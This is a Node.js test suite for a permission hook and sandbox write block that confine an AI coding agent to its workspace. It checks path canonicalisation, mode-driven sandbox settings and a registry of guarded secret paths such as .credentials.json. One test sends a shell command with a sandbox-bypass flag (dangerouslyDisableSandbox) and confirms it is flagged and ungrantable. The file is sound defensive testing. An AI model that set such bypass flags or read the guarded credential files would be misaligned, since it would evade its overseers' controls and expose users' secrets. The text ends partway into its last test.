'use strict';
// The boundary stops flooding, proven at its three layers: the block the
// runtime is started with names the runtime's own measured plumbing, every
// comparison canonicalises so one directory under two names is one identity,
// the block is driven by workspace mode alone (Knowledge mode carries it,
// Code mode withdraws it, and nothing else can reach it), and a crossing
// into the agent's own folder is graded by persistence, not location. Fixtures
// are real directories, real symlinks and the machine's own /private alias,
// because every false card in the field came from a spelling a hand-built
// fixture would not have thought to write.
const { test, describe, after } = require('node:test');
const assert = require('node:assert');
const fs = require('node:fs');
const os = require('node:os');
const path = require('node:path');

const ROOT = path.join(__dirname, '..', '..');
const hook = require('../../scripts/permission-hook.js');
const scaffold = require('../../lib/workspace/scaffold.js');
const boundary = require('../../lib/workspace/boundary.js');
const permissions = require('../../public/permissions.js');
const config = require('../../lib/config.js');

const made = [];
after(() => { for (const d of made) fs.rmSync(d, { recursive: true, force: true }); });
function tmp(prefix) {
  const d = fs.mkdtempSync(path.join(os.tmpdir(), prefix));
  made.push(d);
  return d;
}

describe('the block names the runtime\'s measured plumbing, and the doc names the measurement', () => {
  test('every root beyond the workspace appears in the boundary statement', () => {
    // The doc is the diagnosis's home, so the list the code enforces and the
    // list the reader is told are bound: a root added to one without the
    // other fails here, in whichever direction the drift ran.
    const doc = fs.readFileSync(path.join(ROOT, 'ARCHITECTURE.md'), 'utf8');
    const block = scaffold.sandboxSettings('/w/ws', 'darwin', '/Users/someone', ['/var/folders/zz/T', '/private/var/folders/zz/T']);
    const roots = block.filesystem.allowWrite.slice(1); // beyond the workspace
    for (const root of roots) {
      const name = root.startsWith('/Users/someone') ? root.slice('/Users/someone/'.length) : root;
      // The cache has always been described in prose; the rest are named
      // literally, because a reader chasing a denial searches for the path.
      const mention = name === '.npm' ? 'npm cache' : name.includes('var/folders') ? '/var/folders' : name;
      assert.ok(doc.includes(mention), `the boundary statement names ${mention}, which the block enforces`);
    }
    assert.match(doc, /Claude Code 2\.1\.259/, 'the measured runtime version is named');
    assert.match(doc, /2026-09-03/, 'and the date the measurement was taken');
  });

  test('the writable set carries the workspace, the cache, the runtime roots, then this machine\'s temp roots', () => {
    const block = scaffold.sandboxSettings('/w/ws', 'darwin', '/Users/someone');
    const roots = block.filesystem.allowWrite;
    assert.strictEqual(roots[0], '/w/ws');
    assert.strictEqual(roots[1], '/Users/someone/.npm');
    assert.strictEqual(roots[2], '/Users/someone/.claude', 'the runtime\'s home state, fourteen subsystems measured writing in a day');
    assert.strictEqual(roots[3], '/Users/someone/.claude.json', 'the configuration the runtime writes continuously');
    assert.strictEqual(roots[4], '/tmp/claude');
    assert.strictEqual(roots[5], '/private/tmp/claude');
    const tail = roots.slice(6);
    assert.ok(tail.length >= 1 && tail.includes(os.tmpdir()), 'the tail is this machine\'s own temp directory');
  });

  test('a block the two-root release wrote is still recognised as ours, so it upgrades instead of rotting', () => {
    const legacy = {
      enabled: true,
      autoAllowBashIfSandboxed: true,
      filesystem: { allowWrite: ['/w/old-ws', '/Users/them/.npm'] },
      network: { allowedDomains: ['*'] },
    };
    assert.strictEqual(scaffold.isRundockSandbox(legacy), true,
      'read as a person\'s edit instead, the old block would deny the runtime its plumbing forever');
  });

  test('a block from another machine is ours with a stale tail, which is what lets the reconcile rewrite it', () => {
    const other = scaffold.sandboxSettings('/w/ws', 'darwin', '/Users/me', ['/var/folders/other-machine/T']);
    assert.strictEqual(scaffold.isRundockSandbox(other), true, 'recognised');
    const desired = scaffold.sandboxSettings('/w/ws', 'darwin', '/Users/me');
    assert.notDeepStrictEqual(other, desired, 'and not current, so the reconcile has something to do');
  });

  test('a block a person edited is not ours, in either shape', () => {
    const reordered = scaffold.sandboxSettings('/w/ws', 'darwin', '/Users/me');
    const w = reordered.filesystem.allowWrite;
    [w[2], w[3]] = [w[3], w[2]];
    assert.strictEqual(scaffold.isRundockSandbox(reordered), false, 'the order is contract');
  });

  // Pinned against EXPLICIT tail values via sandboxSettings' own tmpRoots
  // parameter, not against whatever os.tmpdir() happens to realpath to on
  // the machine running the suite. The old version of this test pushed an
  // extra root onto a block built from THIS host's tempRoots(): on a host
  // with a two-entry tail (macOS, with its /var -> /private/var alias) that
  // pushes the block past the permitted head+2 length and the extra root is
  // rejected for the wrong reason; on a host whose tmpdir has no distinct
  // real path (most Linux runners) the tail is one entry, the push lands
  // inside the still-permitted one-or-two-entry window, and the assertion
  // fails outright, meaning 'anything else is somebody's edit' went
  // unenforced there entirely.
  // A DELIBERATE NARROWING, RECORDED RATHER THAN DELETED.
  //
  // Two tests here used to assert that a root appended to Rundock's own block
  // proved a person had edited it, so the block was left alone forever. They
  // were right about the old shape, where the tail was one or two temp roots
  // and the entry COUNT was itself the evidence.
  //
  // The block now also carries the folders the user named in Working Folders.
  // That list is arbitrary in length and content, so an appended root and a
  // named folder are the same bytes in the same position, and no rule can
  // separate them. Keeping the old guarantee would need a record, kept outside
  // the block, of what Rundock last wrote; a record that can be lost or go
  // stale, and every way of losing it strands the workspace with a block
  // Rundock can no longer rewrite or withdraw, which is precisely the failure
  // this whole change exists to end.
  //
  // What is given up: a write root added by hand to settings.local.json is
  // regenerated away on the next open. It NARROWS rather than widens, since
  // their extra root is dropped rather than kept, and the supported place to
  // name a folder now actually reaches the sandbox, which it did not before.
  //
  // What still holds is asserted below, and in the two neighbouring tests: the
  // head's order is contract, and a block with no temp tail at all is still
  // refused and still left untouched.
  test('an appended root now reads as a named folder, the cost of the folder list being any length', () => {
    const oneEntryTail = ['/var/folders/zz/one-entry-host/T'];
    const legitOne = scaffold.sandboxSettings('/w/ws', 'darwin', '/Users/me', oneEntryTail);
    assert.strictEqual(scaffold.isRundockSandbox(legitOne), true, 'a lone temp root, on its own, is ours');

    const oneEntryPlusExtra = scaffold.sandboxSettings('/w/ws', 'darwin', '/Users/me', oneEntryTail);
    oneEntryPlusExtra.filesystem.allowWrite.push('/Users/me/their-own-root');
    assert.strictEqual(scaffold.isRundockSandbox(oneEntryPlusExtra), true,
      'indistinguishable from a block written for a workspace naming that folder, so it is ours and gets regenerated');

    const twoEntryTail = ['/var/folders/zz/two-entry-host/T', '/private/var/folders/zz/two-entry-host/T'];
    const legitTwo = scaffold.sandboxSettings('/w/ws', 'darwin', '/Users/me', twoEntryTail);
    assert.strictEqual(scaffold.isRundockSandbox(legitTwo), true, 'the raw spelling and its /private pairing are ours');
  });

  test('the head is still what proves authorship, so a stranger\'s block is still refused', () => {
    // The guarantee that replaces the length check. Six entries in fixed
    // positions, every one rebuilt from the block's own claimed workspace and
    // home: a block that does not open with them was not written here,
    // however its tail looks.
    const notOurs = scaffold.sandboxSettings('/w/ws', 'darwin', '/Users/me', ['/var/folders/zz/h/T']);
    notOurs.filesystem.allowWrite[3] = '/Users/me/not-a-runtime-root';
    assert.strictEqual(scaffold.isRundockSandbox(notOurs), false,
      'a runtime root replaced in the head, so the head no longer rebuilds and the block is left alone');

    const wrongHome = scaffold.sandboxSettings('/w/ws', 'darwin', '/Users/me', ['/var/folders/zz/h/T']);
    wrongHome.filesystem.allowWrite[1] = '/Users/someone-else/.npm';
    assert.strictEqual(scaffold.isRundockSandbox(wrongHome), false,
      'a cache root under a different home than the runtime roots claim: not a shape Rundock ever writes');
  });

  // With an empty tail the pairing check is skipped, so a person who
  // trimmed the temp roots out of Rundock's own block would have that edit
  // silently reconciled away by the whole-block comparison alone.
  test('a block whose allowWrite is exactly the head, with no temp-directory tail at all, is not recognised as ours, and a reconcile leaves it untouched', () => {
    const headOnly = scaffold.sandboxSettings('/w/ws', 'darwin', '/Users/me', []);
    assert.strictEqual(scaffold.isRundockSandbox(headOnly), false,
      'a real Rundock block always carries at least one temp root; a head with none is not recognised as ours');
    const ws = tmp('wb-head-only-');
    fs.mkdirSync(path.join(ws, '.claude'), { recursive: true });
    const trimmed = scaffold.sandboxSettings(ws, 'darwin', os.homedir(), []);
    fs.writeFileSync(path.join(ws, '.claude', 'settings.local.json'), JSON.stringify({ sandbox: trimmed }));
    scaffold.reconcileSandboxForMode(ws, 'knowledge', 'darwin');
    const settings = JSON.parse(fs.readFileSync(path.join(ws, '.claude', 'settings.local.json'), 'utf8'));
    assert.deepStrictEqual(settings.sandbox, trimmed, 'a block a person trimmed the temp roots out of is left exactly as they left it');
  });

  test('a second tail entry that is a real-path spelling of the first, but not the /private one, is still recognised as ours', () => {
    // A developer-set TMPDIR, or a relocated temp volume, resolves through a
    // symlink that shares no /private prefix at all: the second entry is a
    // real-path spelling of the first (it ends with it, the shape every
    // realpath resolution produces), but is not the macOS-specific pairing.
    // Before this fix, `ours` read false for a block like this forever, and
    // reconcileSandboxForMode could neither update nor withdraw it.
    const relocatedTail = ['/Users/dev/tmp-mount/T', '/Volumes/ExternalDrive/Users/dev/tmp-mount/T'];
    const block = scaffold.sandboxSettings('/w/ws', 'darwin', '/Users/dev', relocatedTail);
    assert.strictEqual(scaffold.isRundockSandbox(block), true,
      'a non-/private real-path pairing is still ours, because it is still a real-path spelling of the raw name');

    const ws = tmp('wb-relocated-tmp-');
    fs.mkdirSync(path.join(ws, '.claude'), { recursive: true });
    fs.writeFileSync(path.join(ws, '.claude', 'settings.local.json'), JSON.stringify({
      sandbox: scaffold.sandboxSettings(ws, 'darwin', '/Users/dev', relocatedTail),
    }));
    scaffold.reconcileSandboxForMode(ws, 'code', 'darwin');
    const settings = JSON.parse(fs.readFileSync(path.join(ws, '.claude', 'settings.local.json'), 'utf8'));
    assert.strictEqual(settings.sandbox.enabled, false,
      'moving to Code mode switches the block off on a block carrying this tail, exactly as it does for the /private pairing');
  });
});

describe('one directory under two names is one identity', () => {
  test('a workspace reached through a symlink contains its own files', () => {
    const real = tmp('wb-real-');
    fs.mkdirSync(path.join(real, 'notes'));
    fs.writeFileSync(path.join(real, 'notes', 'a.md'), 'x');
    const linkHome = tmp('wb-links-');
    const link = path.join(linkHome, 'vault');
    fs.symlinkSync(real, link);
    const viaLink = hook.classifyFileAccess('Read', { file_path: path.join(link, 'notes', 'a.md') }, real, []);
    assert.strictEqual(viaLink.where, 'inside',
      'the file is in the workspace however the road to it is spelled');
    const linkRoot = hook.classifyFileAccess('Read', { file_path: path.join(real, 'notes', 'a.md') }, link, []);
    assert.strictEqual(linkRoot.where, 'inside',
      'and a workspace OPENED through the symlink still contains its real files, which is the Dropbox-vault shape');
  });

  test('the /private alias never cards an inside path', () => {
    const ws = tmp('wb-alias-');
    fs.writeFileSync(path.join(ws, 'f.txt'), 'x');
    const real = fs.realpathSync(ws);
    // On macOS these are two spellings; where they coincide the assertions
    // still hold, they just stop being interesting.
    assert.strictEqual(hook.classifyFileAccess('Read', { file_path: path.join(real, 'f.txt') }, ws, []).where, 'inside');
    assert.strictEqual(hook.classifyFileAccess('Read', { file_path: path.join(ws, 'f.txt') }, real, []).where, 'inside');
  });

  test('a case variant of an inside path never cards, and canonicalises to the real spelling, driven both ways', () => {
    // The old version of this test built the target by joining the variant
    // onto `ws` itself, so the target already started with the root spelled
    // byte for byte. An unresolved startsWith comparison passes on that
    // prefix alone and never even looks at the differing segment, so it read
    // 'inside' with or without canonicalisation and proved nothing about
    // case. Checking resolvedPath rather than only `where` is what makes the
    // case spelling decide the outcome: canonicalisation is the only thing
    // that can turn the handed-in variant into the file's real casing.
    // Both kinds driven explicitly through the injected seam, not by probing the real test host.
    const wsReal = hook.canonicalize(tmp('wb-case-'));
    fs.mkdirSync(path.join(wsReal, 'Docs'));
    fs.writeFileSync(path.join(wsReal, 'Docs', 'a.md'), 'x');
    const real = path.join(wsReal, 'Docs', 'a.md');
    const variant = path.join(wsReal, 'dOCS', 'a.md');
    const folded = hook.classifyFileAccess('Read', { file_path: variant }, wsReal, [], os.homedir(), true, true);
    assert.strictEqual(folded.where, 'inside');
    assert.strictEqual(folded.resolvedPath, real, 'folding, the real on-disk spelling is reported, not the variant case handed in');
    const notFolded = hook.classifyFileAccess('Read', { file_path: variant }, wsReal, [], os.homedir(), true, false);
    assert.strictEqual(notFolded.where, 'inside', 'still inside: judged by its nearest existing ancestor');
    assert.strictEqual(notFolded.resolvedPath, variant, 'not folding, nothing resolves the variant to the real spelling');
  });

  test('a target that does not exist yet is judged by its nearest existing ancestor', () => {
    const real = tmp('wb-unborn-');
    const linkHome = tmp('wb-unborn-link-');
    const link = path.join(linkHome, 'ws');
    fs.symlinkSync(real, link);
    const unborn = path.join(link, 'new-folder', 'new-file.md');
    assert.strictEqual(hook.classifyFileAccess('Write', { file_path: unborn }, real, []).where, 'inside',
      'the unborn tail rides on the canonicalised ancestor');
  });

  test('a genuinely outside path still cards, canonicalised', () => {
    const ws = tmp('wb-out-ws-');
    const elsewhere = tmp('wb-out-else-');
    const r = hook.classifyFileAccess('Write', { file_path: path.join(elsewhere, 'x.md') }, ws, []);
    assert.strictEqual(r.where, 'outside');
    assert.strictEqual(r.resolvedPath, hook.canonicalize(path.join(elsewhere, 'x.md')),
      'and the card names the real path, not a spelling');
  });

  test('a standing grant covers its folder under any spelling', () => {
    const ws = tmp('wb-grant-ws-');
    const target = tmp('wb-grant-target-');
    const linkHome = tmp('wb-grant-link-');
    const link = path.join(linkHome, 'shared');
    fs.symlinkSync(target, link);
    const original = config.getWorkspace();
    config.setWorkspace(ws);
    try {
      boundary.addBoundaryGrant(link);
      assert.strictEqual(boundary.boundaryGrantCovers(path.join(target, 'file.md')), true,
        'granted through the symlink, asked about through the real path: one folder, one decision');
      // The mirror of the line above, and the only assertion here that drives
      // canonicalisation of the ASKED-ABOUT path. addBoundaryGrant already
      // canonicalises on write, so the stored grant is the real spelling: the
      // question arriving under the symlink spelling is the sole thing left
      // that has to be resolved. Asking through `link`, a symlink this test
      // makes itself, is what carries that on every platform. Asking through
      // a path from os.tmpdir() does it only on hosts where the temp dir
      // itself sits behind an alias (macOS /var -> /private/var), which left
      // the guard proving nothing on Linux and so nothing in CI.
      assert.strictEqual(boundary.boundaryGrantCovers(path.join(link, 'file.md')), true,
        'and granted under the real path, asked about through the symlink: still one folder, one decision');
      assert.strictEqual(boundary.boundaryGrantCovers(path.join(linkHome, 'other', 'f.md')), false,
        'and the grant covers only what its author meant');
    } finally {
      config.setWorkspace(original);
    }
  });

  test('a grant stored under an older, non-canonical spelling still covers what its author meant, on the read side alone', () => {
    // The test above writes through addBoundaryGrant, so its write-side
    // canonicalize already stores the real path: that assertion would hold
    // even with read-side canonicalisation deleted, and proves nothing about
    // it on its own. Here the grants file is written directly, the way an
    // older release (before write-side canonicalisation existed) would have
    // left it on disk: the symlink spelling itself, never resolved. Only
    // canonicalising the stored grant AT READ TIME can make this cover the
    // folder its author meant.
    const target = tmp('wb-readgrant-target-');
    const linkHome = tmp('wb-readgrant-link-');
    const link = path.join(linkHome, 'shared');
    fs.symlinkSync(target, link);
    const ws = tmp('wb-readgrant-ws-');
    const original = config.getWorkspace();
    config.setWorkspace(ws);
    try {
      const grantsFile = boundary.boundaryPermissionsPath();
      fs.mkdirSync(path.dirname(grantsFile), { recursive: true });
      fs.writeFileSync(grantsFile, JSON.stringify({ allowedDirs: [link] }));
      assert.strictEqual(boundary.boundaryGrantCovers(path.join(fs.realpathSync(target), 'file.md')), true,
        'a file under the granted folder\'s real path is covered, even though the grant on disk is still spelled through the symlink');
      assert.strictEqual(boundary.boundaryGrantCovers(path.join(linkHome, 'other', 'f.md')), false,
        'and a sibling outside the granted folder is not, so this is not merely "everything covers everything"');
    } finally {
      config.setWorkspace(original);
    }
  });
});

// The OS write block is driven by workspace mode and by nothing else.
// There is no separate opt-out any more; lib/protocol/handlers/workspace.js's
// handleSetWorkspaceMode drives lib/workspace/scaffold.js's
// reconcileSandboxForMode directly, and these tests exercise that function
// (and scaffoldWorkspace's own reconcile, which reads the persisted mode on
// every ordinary open) at the scaffold layer. The protocol-level proof that
// no OTHER message can reach the block lives alongside the rest of the
// dispatch table in test/unit/protocol-handlers-lib.test.js.
describe('the block is driven by mode, and only by mode', () => {
  function workspaceWithBlock() {
    const ws = tmp('wb-mode-');
    fs.mkdirSync(path.join(ws, '.claude'), { recursive: true });
    return ws;
  }

  test('reconcileSandboxForMode writes the block for knowledge mode and withdraws it for code mode; switching back restores it', () => {
    const ws = workspaceWithBlock();
    // 'darwin' explicitly: sandboxSettings returns null on any other
    // platform, so a call defaulted to process.platform writes no block at
    // all on a non-darwin host and the read-back below throws ENOENT there,
    // the same reason scaffoldWorkspace is given { platform: 'darwin' } in
    // the sibling tests below.
    scaffold.reconcileSandboxForMode(ws, 'knowledge', 'darwin');
    const settingsPath = path.join(ws, '.claude', 'settings.local.json');
    let settings = JSON.parse(fs.readFileSync(settingsPath, 'utf8'));
    assert.ok(settings.sandbox, 'knowledge mode: the block is written');
    const knowledgeRoots = settings.sandbox.filesystem.allowWrite;
    scaffold.reconcileSandboxForMode(ws, 'code', 'darwin');
    settings = JSON.parse(fs.readFileSync(settingsPath, 'utf8'));
    assert.strictEqual(settings.sandbox.enabled, false, 'code mode: the block is switched off, not left silent');
    assert.deepStrictEqual(settings.sandbox.filesystem.allowWrite, knowledgeRoots,
      'and the paths are kept, so the folders the user chose survive the round trip '
      + 'rather than being rebuilt from nothing on the way back to Knowledge mode');
    scaffold.reconcileSandboxForMode(ws, 'knowledge', 'darwin');
    settings = JSON.parse(fs.readFileSync(settingsPath, 'utf8'));
    assert.strictEqual(settings.sandbox.enabled, true, 'moving back to knowledge mode restores the enable');
  });

  test('the reported case, end to end: the named folder is inside for the hook AND writable for the operating system', () => {
    // THE BUG REPORT, REPRODUCED. A workspace in Code mode with ~/Projects
    // named, running `cd ~/Projects/<repo> && node scripts/x.mjs`, drew a
    // permission card on every invocation.
    //
    // The hook always agreed that folder was inside; it was the operating
    // system that refused, and the refusal became a card by a path that no
    // grant can answer. Proving the fix therefore needs BOTH halves asserted
    // together: the hook reports no crossing, and the same folder is in the
    // write list handed to the sandbox. Either alone is what the product had
    // before, and what it had before was the defect.
    const ws = tmp('wb-reported-case-');
    const named = path.join(os.homedir(), 'Projects');
    const command = `cd ${path.join(named, 'alchemist')} && node scripts/x.mjs`;

    const access = hook.classifyShellAccess('Bash', { command }, ws, [named], os.homedir(), false);
    assert.strictEqual(access, null,
      'the hook finds no crossing: the folder the person named is inside, as it always was');

    const block = scaffold.sandboxSettings(ws, 'darwin', os.homedir(), ['/tmp/t'], [named], 'code');
    assert.ok(block.filesystem.allowWrite.includes(named),
      'and the operating system is finally told the same thing, which is the half that was missing');

    // THE PATH THAT PRODUCED THE CARD, still ungrantable by design. This is
    // what the fix avoids reaching, not something it teaches the hook to
    // forgive: a sandbox refusal the runtime retries carries no path at all,
    // so no folder grant could ever answer it.
    const escape = hook.classifyShellAccess('Bash', { command, dangerouslyDisableSandbox: true }, ws, [named], os.homedir(), false);
    assert.strictEqual(escape.where, 'outside');
    assert.strictEqual(escape.grantable, false,
      'naming a folder never silenced this card, which is why the folder had to reach the sandbox instead');
    assert.deepStrictEqual(escape.crossings, [],
      'and it names no path, so there was nothing for a grant to cover');
  });

  test('a block carrying a stale folder list is rewritten to the current one, not merely recognised', () => {
    // Recognition is only half of reconciliation: a block can be correctly
    // identified as ours and still be left on disk naming a folder the person
    // removed weeks ago. This drives the whole path and reads the file back.
    const ws = tmp('wb-stale-folders-');
    fs.mkdirSync(path.join(ws, '.claude'), { recursive: true });
    fs.mkdirSync(path.join(ws, '.rundock'), { recursive: true });
    const current = tmp('wb-stale-current-');
    const stale = '/Users/someone/NamedLongAgo';
    // What the workspace names TODAY.
    fs.writeFileSync(path.join(ws, '.rundock', 'state.json'),
      JSON.stringify({ workspaceMode: 'knowledge', workingFolders: [current] }));
    // What the block on disk still names, written by an earlier run.
    const old = scaffold.sandboxSettings(ws, 'darwin', os.homedir(), ['/tmp/t'], [stale]);
    fs.writeFileSync(path.join(ws, '.claude', 'settings.local.json'), JSON.stringify({ sandbox: old }));
    assert.strictEqual(scaffold.isRundockSandbox(old), true, 'fixture sanity: the stale block is recognised as ours');

    scaffold.reconcileSandboxForMode(ws, 'knowledge', 'darwin');

    const roots = JSON.parse(fs.readFileSync(path.join(ws, '.claude', 'settings.local.json'), 'utf8'))
      .sandbox.filesystem.allowWrite;
    assert.ok(roots.includes(current), 'the folder the workspace names now is writable');
    assert.ok(!roots.includes(stale),
      'and the one it no longer names is gone, rather than being left in place because the block was ours');
  });

  test('an unreadable settings file is never overwritten: only a genuinely absent file starts from empty', () => {
    // The bug this guards: {} stood in for EVERY read failure, absent or
    // not, so a corrupt settings.local.json (a hand-added comment, a torn
    // read while Claude Code itself was mid-write) got silently replaced
    // with a lone { sandbox: ... } key, discarding every permission-hook
    // entry the file carried, while the caller still reported success.
    const ws = workspaceWithBlock();
    const settingsPath = path.join(ws, '.claude', 'settings.local.json');
    const corrupt = '{ "hooks": { "PreToolUse": [ // a hand-added comment breaks this\n';
    fs.writeFileSync(settingsPath, corrupt);
    assert.throws(() => scaffold.reconcileSandboxForMode(ws, 'knowledge', 'darwin'),
      /could not read/, 'the read/parse failure is surfaced rather than swallowed');
    assert.strictEqual(fs.readFileSync(settingsPath, 'utf8'), corrupt,
      'and the file\'s bytes are exactly as they were: nothing started from {} and overwrote it');
  });

  test('the next open honours the persisted mode, not only the switch\'s immediate write: withdrawn for a code-mode workspace, present for a knowledge-mode one', () => {
    // reconcileSandboxForMode proves the switch's own immediate write above.
    // This is the separate branch in scaffoldWorkspace itself
    // (workspaceModeFor(dir) gating `desired`), reached on every ordinary
    // workspace open, not only through the switch. Nothing exercised it: the
    // only prior assertion about it read back the state flag rather than
    // running scaffoldWorkspace against a code-mode workspace and checking
    // what landed in settings.local.json.
    const prevDeps = scaffold.wireScaffoldDeps({ invalidateAgentCache: () => {}, rebaselineAgentsWatcher: () => {} });
    try {
      const codeModeWs = tmp('wb-scaffold-codemode-');
      // A Rundock-written block already present, as it would be from an
      // earlier, knowledge-mode open.
      scaffold.scaffoldWorkspace(codeModeWs, { platform: 'darwin' });
      const settingsPath = path.join(codeModeWs, '.claude', 'settings.local.json');
      assert.ok(JSON.parse(fs.readFileSync(settingsPath, 'utf8')).sandbox,
        'fixture sanity: a block is present before the mode changes');

      // Persist code mode directly in state.json, the way the mode-change
      // handler does, WITHOUT going through reconcileSandboxForMode's own
      // immediate write: the next open, not the switch, is what is under
      // test.
      fs.writeFileSync(path.join(codeModeWs, '.rundock', 'state.json'), JSON.stringify({ workspaceMode: 'code' }));
      scaffold.scaffoldWorkspace(codeModeWs, { platform: 'darwin' });
      const afterNextOpen = JSON.parse(fs.readFileSync(settingsPath, 'utf8'));
      // CHANGED CONTRACT, PINNED RATHER THAN RELAXED. This used to assert the
      // block was gone. Withdrawing it was never what it appeared to be:
      // `sandbox.enabled` is an OR across every settings layer and Rundock
      // writes one of them, so deleting ours disabled nothing for a user who
      // had enabled the sandbox in their own ~/.claude/settings.json. It only
      // stopped telling that sandbox which folders they had named, which is
      // the reported defect.
      //
      // TIGHTENED AGAIN, AND FOR THE SAME REASON ONE STEP FURTHER. The note
      // above worked out that `enabled` is an OR across layers, then stopped at
      // claiming nothing, which loses that OR just as surely as deleting the
      // block did: silence is not a `false`, and the user's own global settings
      // (or the runtime's default, once any sandbox key exists) supplies the
      // `true`. So Code mode kept inheriting a sandbox it is documented as not
      // having, and a headless browser, which Seatbelt refuses a process-launch
      // primitive no allowWrite entry can grant, met a permission card on every
      // single render. The assertion is stricter again: the block must be
      // present AND must say false out loud.
      assert.ok(afterNextOpen.sandbox, 'a block is written for a code-mode workspace');
      assert.strictEqual(afterNextOpen.sandbox.enabled, false,
        'and it states the sandbox is off, which silence could not do');
      assert.strictEqual('network' in afterNextOpen.sandbox, false,
        'and names no domains, so it widens no network policy the user set');
      assert.ok(Array.isArray(afterNextOpen.sandbox.filesystem.allowWrite),
        'what it does carry is the write list, for the case another layer enabled the sandbox');

      const knowledgeModeWs = tmp('wb-scaffold-knowledgemode-');
      scaffold.scaffoldWorkspace(knowledgeModeWs, { platform: 'darwin' });
      const inSettings = JSON.parse(fs.readFileSync(path.join(knowledgeModeWs, '.claude', 'settings.local.json'), 'utf8'));
      assert.ok(inSettings.sandbox, 'and a workspace with no persisted mode (default knowledge) still gets the block from the same call');
    } finally {
      scaffold.wireScaffoldDeps(prevDeps);
    }
  });

  test('a person\'s own block is never touched by a mode change, in either direction', () => {
    const ws = workspaceWithBlock();
    const theirs = { enabled: false, note: 'mine' };
    fs.writeFileSync(path.join(ws, '.claude', 'settings.local.json'), JSON.stringify({ sandbox: theirs }));
    scaffold.reconcileSandboxForMode(ws, 'code', 'darwin');
    scaffold.reconcileSandboxForMode(ws, 'knowledge', 'darwin');
    const settings = JSON.parse(fs.readFileSync(path.join(ws, '.claude', 'settings.local.json'), 'utf8'));
    assert.deepStrictEqual(settings.sandbox, theirs, 'whoever wrote it decided something');
  });

  test('the legacy block upgrades to the measured shape through the mode reconcile', () => {
    const ws = workspaceWithBlock();
    const home = os.homedir();
    const legacy = {
      enabled: true, autoAllowBashIfSandboxed: true,
      filesystem: { allowWrite: [ws, path.posix.join(home, '.npm')] },
      network: { allowedDomains: ['*'] },
    };
    fs.writeFileSync(path.join(ws, '.claude', 'settings.local.json'), JSON.stringify({ sandbox: legacy }));
    // 'darwin' explicitly, for the same reason as the reconcile test above:
    // the legacy block is recognised as ours regardless of host platform
    // (its authorship check is always against the darwin shape), but on a
    // non-darwin host a defaulted `desired` computes null, so `ours && !desired`
    // DELETES the legacy block instead of upgrading it, and the read below
    // throws TypeError on the now-absent settings.sandbox.filesystem.
    scaffold.reconcileSandboxForMode(ws, 'knowledge', 'darwin');
    const settings = JSON.parse(fs.readFileSync(path.join(ws, '.claude', 'settings.local.json'), 'utf8'));
    assert.ok(settings.sandbox.filesystem.allowWrite.includes(path.posix.join(home, '.claude')),
      'the two-root block became the measured block on the next reconcile');
  });
});

describe('the agent\'s own folder: three tiers, one registry', () => {
  // Scoped to the boundary passage itself (marked off in ARCHITECTURE.md by
  // an HTML comment pair) rather than matched anywhere in the whole file: a
  // bare substring search would pass even with the paragraph deleted,
  // because several of these names ('agents', 'skills', 'commands',
  // 'hooks') already occur elsewhere in the document for unrelated reasons.
  // Bound in BOTH directions: every registry entry must appear in the
  // passage, and the passage must name no secret or persistence-surface
  // path the registry does not also enforce, so a name added to prose
  // without a matching registry entry is caught too.
  function boundaryPassage() {
    const doc = fs.readFileSync(path.join(ROOT, 'ARCHITECTURE.md'), 'utf8');
    const start = doc.indexOf('<!-- boundary-registry-start -->');
    const end = doc.indexOf('<!-- boundary-registry-end -->');
    assert.ok(start !== -1 && end !== -1 && end > start, 'the boundary passage markers are present in ARCHITECTURE.md');
    return doc.slice(start, end);
  }
  // Every backtick-quoted, path-shaped token the passage cites as a name
  // living under `~/.claude`: the registry side of the binding checks that
  // none of these are strays the registry does not also enforce.
  function passageNames(passage) {
    const names = [];
    const re = /`([a-zA-Z0-9_.-]+(?:\/|\.json))`/g;
    let m;
    while ((m = re.exec(passage)) !== null) names.push(m[1].replace(/\/$/, ''));
    return [...new Set(names)];
  }

  test('the registry and the boundary passage name each other, in both directions', () => {
    const passage = boundaryPassage();
    // BOTH runtime homes. The Codex rows were added and this line was not,
    // so the new entries were enforced in code and named in no document: the
    // exact drift this test exists to stop, reintroduced by the change that
    // extended the thing it guards.
    const registryNames = [
      ...hook.SECRET_RELATIVE_PATHS, ...hook.PERSISTENCE_SURFACE_DIRS, ...hook.PERSISTENCE_SURFACE_FILES,
      ...hook.CODEX_SECRET_RELATIVE_PATHS, ...hook.CODEX_PERSISTENCE_SURFACE_DIRS, ...hook.CODEX_PERSISTENCE_SURFACE_FILES,
      ...hook.HOME_SECRET_FILES,
    ];
    for (const name of registryNames) {
      assert.ok(passage.includes(name), `the boundary passage names ${name}, which the registry enforces`);
    }
    // The reverse direction: a name the passage cites is not free to be a
    // stray. `.claude` and `.claude.json`-shaped scratch entries the passage
    // lists as FREE are not registry entries and are excluded on purpose;
    // everything else the passage cites as secret or persistence-tier must
    // be one the registry actually carries.
    const scratchNamedInPassage = ['projects', 'cache', 'paste-cache', 'downloads', 'tasks',
      'file-history', 'shell-snapshots', 'session-env', 'history.jsonl'];
    for (const name of passageNames(passage)) {
      if (scratchNamedInPassage.includes(name)) continue;
      assert.ok(registryNames.includes(name),
        `the boundary passage names ${name} as governed, but the registry does not enforce it`);
    }
  });

  test('isSecretPath and isPersistenceSurface match only their own registry entries, under a symlink spelling, and nowhere else', () => {
    const home = tmp('af-registry-home-');
    fs.mkdirSync(path.join(home, '.claude', 'projects'), { recursive: true });
    const linkHome = tmp('af-registry-link-');
    const link = path.join(linkHome, 'dot');
    fs.symlinkSync(path.join(home, '.claude'), link);
    assert.strictEqual(hook.isSecretPath(path.join(link, '.credentials.json'), home), true,
      'a spelling through a symlink is the same file');
    assert.strictEqual(hook.isSecretPath(path.join(home, 'Documents', '.credentials.json'), home), false,
      'the same filename elsewhere in the home directory is not the registry\'s entry');
    assert.strictEqual(hook.isPersistenceSurface(path.join(home, '.claude', 'projects', 'p', 'settings.json'), home), false,
      'the named FILE matches only at the folder root, not a same-named file nested somewhere already free');
  });

  // A REGISTRY PATH IS RECOGNISED HOWEVER IT IS SPELLED, INCLUDING BEFORE IT
  // EXISTS. canonicalize only folds case for path components that already
  // exist: an unborn target realpaths its nearest existing ancestor and
  // reattaches the rest verbatim, spelling and all. A write to a case
  // variant of a registry folder that has not been created yet (`Hooks/`
  // before `hooks/` exists) would otherwise escape the registry comparison
  // entirely on a filesystem that folds case. The host's case behaviour is a
  // defaulted seam (`foldsCase`) so both filesystem kinds are exercised
  // explicitly here, on any machine running the suite, rather than one
  // behaviour being selected by whatever the test host's real filesystem
  // happens to do.
  test('a case variant of an unborn persistence-surface folder is recognised, or not, exactly as the host\'s case-folding behaviour says, driven both ways', () => {
    const home = tmp('af-case-home-');
